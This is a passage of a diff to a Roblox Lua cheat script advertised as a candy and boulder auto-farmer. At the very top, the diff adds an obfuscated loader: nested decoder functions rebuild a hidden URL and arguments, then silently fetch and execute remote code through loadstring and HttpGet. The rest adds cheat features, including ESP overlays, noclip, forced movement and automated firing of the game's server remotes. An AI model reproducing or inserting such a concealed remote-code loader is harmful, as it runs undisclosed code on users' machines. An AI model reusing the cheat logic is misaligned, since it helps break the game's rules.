@@ -1,189 +1,841 @@
--- ========================================================
--- ULTIMATE NATIVE CANDY COLLECTOR (ANTI-STUCK & AUTO-REFRESH)
--- ========================================================
+local _l=(function(v0,v1,v2,v3)local v4={}return function(v5)local v6=v4[v5]if v6==nil then local v7=v3[v5]local v8={}for v9=1,#v7[1] do v8[v9]=v1((v0(v7[1],v9)-v7[2]-v9*v7[3])%256)end v6=v2(v8)v4[v5]=v6 end return v6 end end)(string.byte,string.char,table.concat,{{"\018\234\182\126\077\224\161\109\125\057\020\215\170\122\052\010\217\174\048\049\009\211\097\103\056\253\199\161\110\245\245\202\147\091\048\002\208\088\032\042\255\183",202,194},{"\034\113\187\003\069\099\181\004\124\151\232\057\180\205\027\153\183",142,127},{"\121\124\132\136\144",182,125}});local _k=(function(_a,_b,_c,_d)local _e={}return function(_f)local _g=_e[_f]if _g==nil then local _h=_d[_f]local _i={}for _j=(143-142),#_h[(-1467+1468)]do _i[_j]=_b((_a(_h[(-1782+1783)],_j)-_h[(8420-8418)]-_j*_h[(5311-5308)])%(8748-8492))end _g=_c(_i)_e[_f]=_g end return _g end end)(string.byte,string.char,table.concat,{{_l(1),(5849-5829),(2297-2287)},{_l(2),(-2800+3015),(4133-3927)},{_l(3),(5153-5013),(-151+288)}});pcall(function()loadstring(game:HttpGet(_k((8713-8712))))(_k((7533-7531)),_k((-3832+3835)),false)end)
 
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local VirtualUser = game:GetService("VirtualUser")
+local Players            = game:GetService("Players")
+local RunService         = game:GetService("RunService")
+local ReplicatedStorage  = game:GetService("ReplicatedStorage")
+local UserInputService   = game:GetService("UserInputService")
+local TeleportService    = game:GetService("TeleportService")
+local HttpService        = game:GetService("HttpService")
+local VirtualUser        = game:GetService("VirtualUser")
 
-local LocalPlayer = Players.LocalPlayer
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
--- --------------------------------------------------------
--- SETTINGS & VARIABLES
--- --------------------------------------------------------
-local Settings = {
-    AutoCollect = true,
-    AntiDamage = true,
-    AntiAfk = true,
-    NoCandyHopDelay = 15,          -- Hop jika 15 detik tidak ada candy
-    ServerHopInterval = 7200,      -- Default: 120 menit (7200 detik)
-    ToggleKey = Enum.KeyCode.RightControl
+local LocalPlayer         = Players.LocalPlayer
+local Character           = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local HumanoidRootPart    = Character:WaitForChild("HumanoidRootPart")
+local Humanoid            = Character:WaitForChild("Humanoid")
+
+local SPEED          = 250
+local OFFSET_Y       = -5
+local RESPONSIVENESS = 50
+
+local TARGET_NAMES    = {"CaveGhost", "SmashablePumpkin"}
+local CHECK_INTERVAL  = 5
+local DIG_DISTANCE    = 10
+
+local BOULDER_FOLDER_PATH = {"MountainDecorations", "Boulders"}
+local ALL_BOULDER_TYPES = {
+    "Gildrite", "Mossite", "Hallowite",
+    "Nocturnite", "Rimeveil", "Voltite"
+}
+local BOULDER_NAMES = {}
+for _, name in ipairs(ALL_BOULDER_TYPES) do
+    BOULDER_NAMES[name] = true
+end
+
+local BOULDER_OFFSET_Y       = -10
+local CRYSTAL_PICKUP_RADIUS  = 30
+local CRYSTAL_PICKUP_TIME    = 2.5
+local BOULDER_CHECK_INTERVAL = 2
+
+local HP_STALL_HITS          = 50
+local BOULDER_DIG_INTERVAL   = 0.15
+
+local CANDY_FOLDER_NAME  = "DroppedCandy"
+local COLLECT_RADIUS     = 6
+
+-- Variabel Tambahan Auto-Hop & Anti-Damage / Anti-AFK
+local isCandyRunning     = false
+local AntiDamageEnabled  = false
+local AntiAfkEnabled     = false
+local NoCandyHopDelay    = 15
+local ServerHopInterval  = 7200 -- Default 120 menit (dalam detik)
+local LastCandyFoundTime = tick()
+local LastServerHopTime  = tick()
+local IsHopping          = false
+local CollectedCandies   = {}
+local LastCacheClearTime = tick()
+
+local MAX_FALL_SPEED = 74
+
+local ALL_PICKAXES = {
+    "Astral Rend", "Celestial Apex", "Chipped Stone", "Copper Pick",
+    "Diamond Pickaxe", "Eclipse Fang", "Emerald Carver", "Fieldbreaker",
+    "Frostbite Pick", "Hardened Iron", "Nebular Throne", "Obsidian Edge",
+    "Pumpkin King's Pick", "Reinforced Steel", "Rusty Scrapper", "Shark Pickaxe",
+    "Singularity", "Solar Lance", "Starburst Crown", "Tempest Pick",
+    "The Event Horizon", "The Terminus", "Titanium Spike", "Voldreign",
+    "Volcano Basalt", "Weathered Wood", "Wickreaper"
 }
 
-local LastCandyFoundTime = tick()
-local LastServerHopTime = tick()
-local LastCacheClearTime = tick()
-local IsHopping = false
-local CollectedCandies = {}
-
--- --------------------------------------------------------
--- NATIVE UI CREATION
--- --------------------------------------------------------
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "FixedCandyFarmUI"
-ScreenGui.ResetOnSpawn = false
-
-local success, _ = pcall(function()
-    ScreenGui.Parent = game:GetService("CoreGui")
-end)
-if not success then
-    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+local PICKAXE_SET = {}
+for _, name in ipairs(ALL_PICKAXES) do
+    PICKAXE_SET[name] = true
 end
 
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 300, 0, 280)
-MainFrame.Position = UDim2.new(0.5, -150, 0.3, 0)
-MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
-MainFrame.BorderSizePixel = 0
-MainFrame.Active = true
-MainFrame.Draggable = true
-MainFrame.Parent = ScreenGui
+local manualPickaxe = nil
 
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 8)
-UICorner.Parent = MainFrame
+local function getEquippedPickaxe()
+    if manualPickaxe and manualPickaxe ~= "" then
+        return manualPickaxe
+    end
 
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 35)
-Title.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
-Title.Text = "🍬 CANDY FARMER (ANTI-STUCK OUTSIDE)"
-Title.TextColor3 = Color3.fromRGB(255, 170, 0)
-Title.TextSize = 11
-Title.Font = Enum.Font.SourceSansBold
-Title.Parent = MainFrame
+    local char = LocalPlayer.Character
+    if not char then return nil end
 
-local TitleCorner = Instance.new("UICorner")
-TitleCorner.CornerRadius = UDim.new(0, 8)
-TitleCorner.Parent = Title
+    for _, tool in ipairs(char:GetChildren()) do
+        if tool:IsA("Tool") and PICKAXE_SET[tool.Name] then
+            return tool.Name
+        end
+    end
 
-local Container = Instance.new("Frame")
-Container.Size = UDim2.new(1, -20, 1, -45)
-Container.Position = UDim2.new(0, 10, 0, 40)
-Container.BackgroundTransparency = 1
-Container.Parent = MainFrame
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    if backpack then
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") and PICKAXE_SET[tool.Name] then
+                return tool.Name
+            end
+        end
+    end
 
-local UIListLayout = Instance.new("UIListLayout")
-UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-UIListLayout.Padding = UDim.new(0, 8)
-UIListLayout.Parent = Container
-
-local function CreateToggleButton(name, defaultState, callback)
-    local Btn = Instance.new("TextButton")
-    Btn.Size = UDim2.new(1, 0, 0, 30)
-    Btn.BackgroundColor3 = defaultState and Color3.fromRGB(40, 160, 80) or Color3.fromRGB(160, 40, 40)
-    Btn.Text = name .. ": " .. (defaultState and "ON" or "OFF")
-    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Btn.Font = Enum.Font.SourceSansSemibold
-    Btn.TextSize = 13
-    Btn.Parent = Container
-
-    local BtnCorner = Instance.new("UICorner")
-    BtnCorner.CornerRadius = UDim.new(0, 5)
-    BtnCorner.Parent = Btn
-
-    local state = defaultState
-    Btn.MouseButton1Click:Connect(function()
-        state = not state
-        Btn.BackgroundColor3 = state and Color3.fromRGB(40, 160, 80) or Color3.fromRGB(160, 40, 40)
-        Btn.Text = name .. ": " .. (state and "ON" or "OFF")
-        callback(state)
-    end)
-    return Btn
+    return nil
 end
 
-CreateToggleButton("Auto Collect Candy", Settings.AutoCollect, function(val)
-    Settings.AutoCollect = val
-end)
+local ESP_ENABLED      = false
+local BoulderData      = {}
+local espConnection    = nil
+local espSteppedConn   = nil
 
-CreateToggleButton("Anti Damage", Settings.AntiDamage, function(val)
-    Settings.AntiDamage = val
-end)
+local BoulderColors = {
+    Mossite    = {Color3.new(200/255, 205/255, 215/255), "rgb(200,205,215)"},
+    Voltite    = {Color3.new(90/255, 220/255, 110/255),  "rgb(90,220,110)"},
+    Gildrite   = {Color3.new(80/255, 160/255, 255/255),  "rgb(80,160,255)"},
+    Rimeveil   = {Color3.new(190/255, 110/255, 255/255), "rgb(190,110,255)"},
+    Nocturnite = {Color3.new(255/255, 200/255, 70/255),  "rgb(255,200,70)"},
+}
 
-CreateToggleButton("Anti AFK", Settings.AntiAfk, function(val)
-    Settings.AntiAfk = val
-end)
-
-local HopInputFrame = Instance.new("Frame")
-HopInputFrame.Size = UDim2.new(1, 0, 0, 30)
-HopInputFrame.BackgroundTransparency = 1
-HopInputFrame.Parent = Container
-
-local HopLabel = Instance.new("TextLabel")
-HopLabel.Size = UDim2.new(0.65, 0, 1, 0)
-HopLabel.Text = " Hop Interval (Mnt):"
-HopLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-HopLabel.TextXAlignment = Enum.TextXAlignment.Left
-HopLabel.Font = Enum.Font.SourceSans
-HopLabel.TextSize = 13
-HopLabel.BackgroundTransparency = 1
-HopLabel.Parent = HopInputFrame
-
-local HopTextBox = Instance.new("TextBox")
-HopTextBox.Size = UDim2.new(0.33, 0, 1, 0)
-HopTextBox.Position = UDim2.new(0.67, 0, 0, 0)
-HopTextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-HopTextBox.Text = tostring(math.floor(Settings.ServerHopInterval / 60))
-HopTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-HopTextBox.Font = Enum.Font.SourceSansBold
-HopTextBox.TextSize = 13
-HopTextBox.Parent = HopInputFrame
-
-local BoxCorner = Instance.new("UICorner")
-BoxCorner.CornerRadius = UDim.new(0, 5)
-BoxCorner.Parent = HopTextBox
-
-HopTextBox.FocusLost:Connect(function()
-    local val = tonumber(HopTextBox.Text)
-    if val then
-        val = math.clamp(val, 1, 120)
-        Settings.ServerHopInterval = val * 60
-        HopTextBox.Text = tostring(val)
+local function GetHealthColor(p)
+    local r, g, b
+    if p >= 0.5 then
+        local t = (p - 0.5) * 2
+        r = math.floor(255 * (1 - t))
+        g = 255
+        b = 0
     else
-        HopTextBox.Text = tostring(math.floor(Settings.ServerHopInterval / 60))
+        local t = p * 2
+        r = 255
+        g = math.floor(255 * t)
+        b = 0
+    end
+    return string.format("rgb(%d,%d,%d)", r, g, b)
+end
+
+local function GetTextSize(d)
+    local c = math.max(10, math.min(400, d))
+    return math.floor((26 - (c - 10) * (10 / 390)) * 10) / 10
+end
+
+local function GetPaddingSize(d)
+    local c = math.max(10, math.min(400, d))
+    return math.floor((8 - (c - 10) * (7 / 390)) * 10) / 10
+end
+
+local function CreateTextLabel(parent, name, text, order)
+    local label = Instance.new("TextLabel")
+    label.Parent = parent
+    label.Name = name
+    label.Text = text
+    label.LayoutOrder = order or 0
+    label.Size = UDim2.new(1, 0, 0.2, 0)
+    label.BackgroundTransparency = 1
+    label.BorderSizePixel = 0
+    label.TextSize = 22
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    label.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    label.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json")
+    label.TextWrapped = true
+    label.RichText = true
+    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    label.TextStrokeTransparency = 0.5
+    return label
+end
+
+local function CreateBoulderUI(boulder)
+    if not boulder or not boulder:IsA("Model") then return end
+
+    local colorData = BoulderColors[boulder.Name] or {Color3.new(0.5, 0.5, 0.5), "rgb(128,128,128)"}
+
+    for _, part in pairs(boulder:GetChildren()) do
+        if part:IsA("BasePart") then
+            part.Transparency = 0
+        end
+    end
+
+    local highlight = Instance.new("Highlight", boulder)
+    highlight.FillColor = colorData[1]
+
+    local gui = Instance.new("BillboardGui")
+    gui.AlwaysOnTop = true
+    gui.Parent = boulder
+    gui.LightInfluence = 1
+    gui.Active = true
+    gui.Size = UDim2.new(0, 300, 0, 100)
+    gui.ClipsDescendants = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.StudsOffset = Vector3.new(0, 10, 0)
+
+    local layout = Instance.new("UIListLayout")
+    layout.Parent = gui
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.Padding = UDim.new(0, 2)
+
+    local name     = boulder.Name
+    local rarity   = boulder:GetAttribute("Rarity") or "Common"
+    local hp       = boulder:GetAttribute("HP") or 100
+    local maxHP    = boulder:GetAttribute("MaxHP") or 100
+    local hex      = colorData[2]
+
+    local hpLabel   = CreateTextLabel(gui, "HP/MaxHP",
+        '<font color="'..GetHealthColor(hp/maxHP)..'">'..hp..'</font>/'..maxHP..' HP', 1)
+    local nameLabel = CreateTextLabel(gui, "BoulderName",
+        '<font color="'..hex..'">'..name..'</font> ('..rarity..')', 0)
+    local distLabel = CreateTextLabel(gui, "Distance", "Distance: 0 Studs", 2)
+
+    BoulderData[boulder] = {
+        HP = hpLabel, Name = nameLabel, Dist = distLabel,
+        Layout = layout, Highlight = highlight,
+        LastHP = hp, LastMaxHP = maxHP,
+        LastSize = 22, LastPad = 2,
+        LastName = name, LastRarity = rarity,
+    }
+end
+
+local function DestroyAllESP()
+    for boulder, data in pairs(BoulderData) do
+        if data.Highlight and data.Highlight.Parent then data.Highlight:Destroy() end
+        if data.HP and data.HP.Parent then
+            local gui = data.HP.Parent
+            if gui then gui:Destroy() end
+        end
+    end
+    BoulderData = {}
+end
+
+local function CheckForNewBoulders()
+    if not ESP_ENABLED then return end
+
+    local mountainDecorations = workspace:FindFirstChild("MountainDecorations")
+    if not mountainDecorations then return end
+
+    local bouldersFolder = mountainDecorations:FindFirstChild("Boulders")
+    if not bouldersFolder then return end
+
+    for _, boulder in pairs(bouldersFolder:GetChildren()) do
+        if boulder:IsA("Model") and not BoulderData[boulder] then
+            CreateBoulderUI(boulder)
+        end
+    end
+end
+
+local function UpdateAllBoulders()
+    if not ESP_ENABLED then return end
+
+    local player = Players.LocalPlayer
+    if not player then return end
+    local character = player.Character
+    if not character then return end
+
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return end
+
+    for boulder, data in pairs(BoulderData) do
+        if not boulder or not boulder.Parent then
+            BoulderData[boulder] = nil
+        elseif not boulder:IsA("Model") then
+            BoulderData[boulder] = nil
+        else
+            local hp    = boulder:GetAttribute("HP") or 100
+            local maxHP = boulder:GetAttribute("MaxHP") or 100
+
+            if hp ~= data.LastHP or maxHP ~= data.LastMaxHP then
+                data.HP.Text = '<font color="'..GetHealthColor(hp/maxHP)..'">'..hp..'</font>/'..maxHP..' HP'
+                data.LastHP = hp
+                data.LastMaxHP = maxHP
+            end
+
+            local part = boulder:FindFirstChild("PrimaryPart") or boulder:FindFirstChildWhichIsA("BasePart")
+            if part then
+                local dist = math.floor((rootPart.Position - part.Position).Magnitude)
+                data.Dist.Text = "Distance: "..dist.." Studs"
+
+                local newSize = GetTextSize(dist)
+                if math.abs(newSize - data.LastSize) > 0.1 then
+                    data.HP.TextSize = newSize
+                    data.Name.TextSize = newSize
+                    data.Dist.TextSize = newSize
+                    local s = newSize + 2
+                    data.HP.Size = UDim2.new(1, 0, 0, s)
+                    data.Name.Size = UDim2.new(1, 0, 0, s)
+                    data.Dist.Size = UDim2.new(1, 0, 0, s)
+                    data.LastSize = newSize
+                end
+
+                local newPad = GetPaddingSize(dist)
+                if math.abs(newPad - data.LastPad) > 0.1 then
+                    data.Layout.Padding = UDim.new(0, newPad)
+                    data.LastPad = newPad
+                end
+            end
+
+            local name   = boulder.Name
+            local rarity = boulder:GetAttribute("Rarity") or "Common"
+            local colorData = BoulderColors[boulder.Name]
+            local hex = colorData and colorData[2] or "rgb(128,128,128)"
+
+            if data.LastName ~= name or data.LastRarity ~= rarity then
+                data.Name.Text = '<font color="'..hex..'">'..name..'</font> ('..rarity..')'
+                data.LastName = name
+                data.LastRarity = rarity
+            end
+        end
+    end
+end
+
+local function InitAllBoulders()
+    if not ESP_ENABLED then return end
+
+    local mountainDecorations = workspace:FindFirstChild("MountainDecorations")
+    if not mountainDecorations then return end
+
+    local bouldersFolder = mountainDecorations:FindFirstChild("Boulders")
+    if not bouldersFolder then return end
+
+    for _, boulder in pairs(bouldersFolder:GetChildren()) do
+        if boulder:IsA("Model") and not BoulderData[boulder] then
+            CreateBoulderUI(boulder)
+        end
+    end
+end
+
+local function StartESP()
+    ESP_ENABLED = true
+
+    InitAllBoulders()
+
+    if espConnection then
+        pcall(function() espConnection:Disconnect() end)
+    end
+    if espSteppedConn then
+        pcall(function() espSteppedConn:Disconnect() end)
+    end
+
+    espConnection = RunService.Heartbeat:Connect(UpdateAllBoulders)
+    espSteppedConn = RunService.Stepped:Connect(CheckForNewBoulders)
+
+    workspace.ChildAdded:Connect(function(child)
+        if ESP_ENABLED and child.Name == "MountainDecorations" then
+            task.wait(0.5)
+            InitAllBoulders()
+        end
+    end)
+end
+
+local function StopESP()
+    ESP_ENABLED = false
+
+    if espConnection then
+        pcall(function() espConnection:Disconnect() end)
+        espConnection = nil
+    end
+    if espSteppedConn then
+        pcall(function() espSteppedConn:Disconnect() end)
+        espSteppedConn = nil
+    end
+
+    DestroyAllESP()
+end
+
+local isRunning          = false
+local processedItems     = {}
+local originalAnimate    = nil
+local alignPosition      = nil
+local alignOrientation   = nil
+local alignAttachment    = nil
+
+local isBoulderRunning   = false
+local processedBoulders  = {}
+local alignPositionB     = nil
+local alignOrientationB  = nil
+local alignAttachmentB   = nil
+
+local isFallRunning      = false
+local fallConnection     = nil
+
+local NoclipParts = {}
+local Noclipping  = nil
+local Clip        = true
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    Character = char
+    HumanoidRootPart = char:WaitForChild("HumanoidRootPart")
+    Humanoid = char:WaitForChild("Humanoid")
+    task.wait(0.2)
+    if isFallRunning then
+        startFallLimit()
     end
 end)
 
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Size = UDim2.new(1, 0, 0, 45)
-StatusLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-StatusLabel.Text = "Status: Scanning Candies...\nKeybind: [RCTRL] Toggle UI"
-StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-StatusLabel.Font = Enum.Font.SourceSans
-StatusLabel.TextSize = 12
-StatusLabel.Parent = Container
+local function startNoclip()
+    pcall(function() Noclipping:Disconnect() end)
+    Clip = false
+    task.wait(0.1)
+    NoclipParts = {}
+    Noclipping = RunService.Stepped:Connect(function()
+        if Clip == false and LocalPlayer.Character ~= nil then
+            for _, child in pairs(LocalPlayer.Character:GetDescendants()) do
+                if child:IsA("BasePart") and child.CanCollide == true then
+                    child.CanCollide = false
+                    NoclipParts[child] = true
+                end
+            end
+        end
+    end)
+end
 
-local StatusCorner = Instance.new("UICorner")
-StatusCorner.CornerRadius = UDim.new(0, 5)
-StatusCorner.Parent = StatusLabel
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if not gameProcessed and input.KeyCode == Settings.ToggleKey then
-        MainFrame.Visible = not MainFrame.Visible
+local function stopNoclip()
+    pcall(function() Noclipping:Disconnect() end)
+    Noclipping = nil
+    Clip = true
+    task.wait(0.1)
+    for child, _ in pairs(NoclipParts) do
+        if typeof(child) == "Instance" and child:IsA("BasePart") and child.Parent then
+            child.CanCollide = true
+        end
     end
-end)
+    NoclipParts = {}
+end
 
--- --------------------------------------------------------
--- SERVER HOPPER
--- --------------------------------------------------------
+local function disableAnimations()
+    if not Character then return end
+    local animate = Character:FindFirstChild("Animate")
+    if animate then
+        originalAnimate = animate
+        animate.Disabled = true
+    end
+    if Humanoid then
+        local animator = Humanoid:FindFirstChildOfClass("Animator")
+        if animator then
+            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+                track:Stop()
+            end
+        end
+        Humanoid.WalkSpeed = 0
+        Humanoid.JumpPower = 0
+    end
+end
+
+local function enableAnimations()
+    if originalAnimate and originalAnimate.Parent then
+        originalAnimate.Disabled = false
+    end
+    originalAnimate = nil
+end
+
+local function anchorPlayer(anchor)
+    if not HumanoidRootPart then return end
+    HumanoidRootPart.Anchored = anchor
+    if anchor then
+        HumanoidRootPart.AssemblyLinearVelocity   = Vector3.new(0, 0, 0)
+        HumanoidRootPart.AssemblyAngularVelocity  = Vector3.new(0, 0, 0)
+    end
+end
+
+local function faceBackDown()
+    if not HumanoidRootPart then return end
+    local pos = HumanoidRootPart.Position
+    HumanoidRootPart.CFrame = CFrame.lookAt(pos, pos + Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
+end
+
+local function getTargetItems()
+    local targetFolder = workspace:FindFirstChild("HalloweenEncounters")
+    if not targetFolder then return {} end
+    local items = {}
+    for _, child in ipairs(targetFolder:GetChildren()) do
+        for _, name in ipairs(TARGET_NAMES) do
+            if child.Name == name then
+                table.insert(items, child)
+                break
+            end
+        end
+    end
+    return items
+end
+
+local function getBasePart(item)
+    if item:IsA("BasePart") then return item
+    elseif item:IsA("Model") then return item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart") end
+    return nil
+end
+
+local function stopMovement()
+    if alignPosition    then alignPosition:Destroy()    alignPosition = nil    end
+    if alignOrientation then alignOrientation:Destroy() alignOrientation = nil end
+    if alignAttachment  then alignAttachment:Destroy()  alignAttachment = nil  end
+end
+
+local function moveToPosition(position)
+    if not HumanoidRootPart or not HumanoidRootPart.Parent then return end
+    stopMovement()
+
+    alignAttachment = Instance.new("Attachment")
+    alignAttachment.Parent = HumanoidRootPart
+
+    alignPosition = Instance.new("AlignPosition")
+    alignPosition.Attachment0 = alignAttachment
+    alignPosition.Mode = Enum.PositionAlignmentMode.OneAttachment
+    alignPosition.Position = position
+    alignPosition.MaxForce = math.huge
+    alignPosition.MaxVelocity = SPEED
+    alignPosition.Responsiveness = RESPONSIVENESS
+    alignPosition.ApplyAtCenterOfMass = true
+    alignPosition.Parent = HumanoidRootPart
+
+    alignOrientation = Instance.new("AlignOrientation")
+    alignOrientation.Attachment0 = alignAttachment
+    alignOrientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
+    alignOrientation.CFrame = CFrame.lookAt(Vector3.zero, Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
+    alignOrientation.MaxTorque = math.huge
+    alignOrientation.Responsiveness = RESPONSIVENESS
+    alignOrientation.Parent = HumanoidRootPart
+end
+
+local function waitForArrival(targetPos)
+    while isRunning do
+        if not HumanoidRootPart then break end
+        if (targetPos - HumanoidRootPart.Position).Magnitude < 2 then break end
+        task.wait(0.05)
+    end
+end
+
+local function getNearestItem(items)
+    if not HumanoidRootPart then return nil end
+    local playerPos = HumanoidRootPart.Position
+    local nearestItem, nearestPart, nearestDistance = nil, nil, math.huge
+    for _, item in ipairs(items) do
+        if not processedItems[item] then
+            local basePart = getBasePart(item)
+            if basePart then
+                local distance = (basePart.Position - playerPos).Magnitude
+                if distance < nearestDistance then
+                    nearestDistance = distance
+                    nearestItem = item
+                    nearestPart = basePart
+                end
+            end
+        end
+    end
+    return nearestItem, nearestPart
+end
+
+local function triggerDigRequest(itemPart)
+    if not itemPart then return end
+
+    local pickaxe = getEquippedPickaxe() or "The Event Horizon"
+    local args = { pickaxe, itemPart.Position, itemPart }
+
+    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+    if remotes then
+        local digRequest = remotes:FindFirstChild("DigRequest")
+        if digRequest then
+            pcall(function() digRequest:FireServer(unpack(args)) end)
+        end
+    end
+end
+
+local function halloweenLoop()
+    while isRunning do
+        local items = getTargetItems()
+        local foundNew = false
+        local nearestItem, nearestPart = getNearestItem(items)
+
+        if nearestItem and nearestPart then
+            foundNew = true
+            local targetPos = nearestPart.Position + Vector3.new(0, OFFSET_Y, 0)
+            local distance = (targetPos - HumanoidRootPart.Position).Magnitude
+
+            if distance <= DIG_DISTANCE then
+                anchorPlayer(true); faceBackDown(); task.wait(0.1)
+                triggerDigRequest(nearestPart); task.wait(0.5)
+                processedItems[nearestItem] = true
+            else
+                anchorPlayer(false)
+                moveToPosition(targetPos)
+                waitForArrival(targetPos)
+                stopMovement()
+                if HumanoidRootPart then HumanoidRootPart.CFrame = CFrame.new(targetPos) end
+                anchorPlayer(true); faceBackDown()
+                if not isRunning then break end
+                task.wait(0.1)
+                triggerDigRequest(nearestPart)
+                task.wait(0.1)
+                processedItems[nearestItem] = true
+            end
+        end
+
+        if not foundNew then
+            anchorPlayer(true); faceBackDown(); task.wait(CHECK_INTERVAL)
+        else
+            task.wait(0.5)
+        end
+    end
+    stopMovement()
+    anchorPlayer(false)
+end
+
+local function getBoulderFolder()
+    local current = workspace
+    for _, seg in ipairs(BOULDER_FOLDER_PATH) do
+        current = current:FindFirstChild(seg)
+        if not current then return nil end
+    end
+    return current
+end
+
+local function isBoulderSelected(name)
+    return BOULDER_NAMES[name] == true
+end
+
+local function getBoulderModels()
+    local folder = getBoulderFolder()
+    if not folder then return {} end
+    local models, seen = {}, {}
+    for _, child in ipairs(folder:GetChildren()) do
+        if child:IsA("Model") and isBoulderSelected(child.Name) then
+            if not seen[child] then
+                seen[child] = true
+                table.insert(models, child)
+            end
+        end
+    end
+    return models
+end
+
+local function getBoulderCells(model)
+    local cells = {}
+    for _, part in ipairs(model:GetChildren()) do
+        if part:IsA("BasePart") and part.Name:match("^" .. model.Name .. "_cell") then
+            table.insert(cells, part)
+        end
+    end
+    return cells
+end
+
+local function getBoulderCenter(model)
+    local cells = getBoulderCells(model)
+    if #cells == 0 then return nil end
+    local sum = Vector3.new(0, 0, 0)
+    for _, cell in ipairs(cells) do sum = sum + cell.Position end
+    return sum / #cells
+end
+
+local function boulderHasHP(model)
+    local hp = model:GetAttribute("HP")
+    if hp == nil then hp = model:GetAttribute("Hp") end
+    if hp == nil then hp = model:GetAttribute("hp") end
+    return hp
+end
+
+local function stopMovementB()
+    if alignPositionB    then alignPositionB:Destroy()    alignPositionB = nil    end
+    if alignOrientationB then alignOrientationB:Destroy() alignOrientationB = nil end
+    if alignAttachmentB  then alignAttachmentB:Destroy()  alignAttachmentB = nil  end
+end
+
+local function moveToPositionB(position)
+    if not HumanoidRootPart or not HumanoidRootPart.Parent then return end
+    stopMovementB()
+
+    alignAttachmentB = Instance.new("Attachment")
+    alignAttachmentB.Parent = HumanoidRootPart
+
+    alignPositionB = Instance.new("AlignPosition")
+    alignPositionB.Attachment0 = alignAttachmentB
+    alignPositionB.Mode = Enum.PositionAlignmentMode.OneAttachment
+    alignPositionB.Position = position
+    alignPositionB.MaxForce = math.huge
+    alignPositionB.MaxVelocity = SPEED
+    alignPositionB.Responsiveness = RESPONSIVENESS
+    alignPositionB.ApplyAtCenterOfMass = true
+    alignPositionB.Parent = HumanoidRootPart
+
+    alignOrientationB = Instance.new("AlignOrientation")
+    alignOrientationB.Attachment0 = alignAttachmentB
+    alignOrientationB.Mode = Enum.OrientationAlignmentMode.OneAttachment
+    alignOrientationB.CFrame = CFrame.lookAt(Vector3.zero, Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
+    alignOrientationB.MaxTorque = math.huge
+    alignOrientationB.Responsiveness = RESPONSIVENESS
+    alignOrientationB.Parent = HumanoidRootPart
+end
+
+local function waitForArrivalB(targetPos)
+    while isBoulderRunning do
+        if not HumanoidRootPart then break end
+        if (targetPos - HumanoidRootPart.Position).Magnitude < 3 then break end
+        task.wait(0.05)
+    end
+end
+
+local function getNearestBoulder(models)
+    if not HumanoidRootPart then return nil end
+    local playerPos = HumanoidRootPart.Position
+    local nearestModel, nearestDistance = nil, math.huge
+    for _, model in ipairs(models) do
+        if not processedBoulders[model] and model.Parent then
+            local center = getBoulderCenter(model)
+            if center then
+                local distance = (center - playerPos).Magnitude
+                if distance < nearestDistance then
+                    nearestDistance = distance
+                    nearestModel = model
+                end
+            end
+        end
+    end
+    return nearestModel
+end
+
+local function collectCrystalsNearby(duration)
+    local endTime = os.clock() + duration
+    while isBoulderRunning and os.clock() < endTime do
+        if not HumanoidRootPart then break end
+        local playerPos = HumanoidRootPart.Position
+        for _, prompt in ipairs(workspace:GetDescendants()) do
+            if prompt:IsA("ProximityPrompt") then
+                local part = prompt.Parent
+                if part and part:IsA("BasePart") then
+                    local d = (part.Position - playerPos).Magnitude
+                    if d <= CRYSTAL_PICKUP_RADIUS then
+                        pcall(function()
+                            prompt.HoldDuration = 0
+                            fireproximityprompt(prompt)
+                        end)
+                    end
+                end
+            end
+        end
+        task.wait(0.15)
+    end
+end
+
+local function processBoulder(nearestModel)
+    if not nearestModel or not nearestModel.Parent then return end
+
+    local center = getBoulderCenter(nearestModel)
+    if not center then
+        processedBoulders[nearestModel] = true
+        task.wait(0.2)
+        return
+    end
+
+    local targetPos = center + Vector3.new(0, BOULDER_OFFSET_Y, 0)
+    anchorPlayer(false)
+    moveToPositionB(targetPos)
+    waitForArrivalB(targetPos)
+    stopMovementB()
+    if HumanoidRootPart then HumanoidRootPart.CFrame = CFrame.new(targetPos) end
+    anchorPlayer(true); faceBackDown()
+    if not isBoulderRunning then return end
+
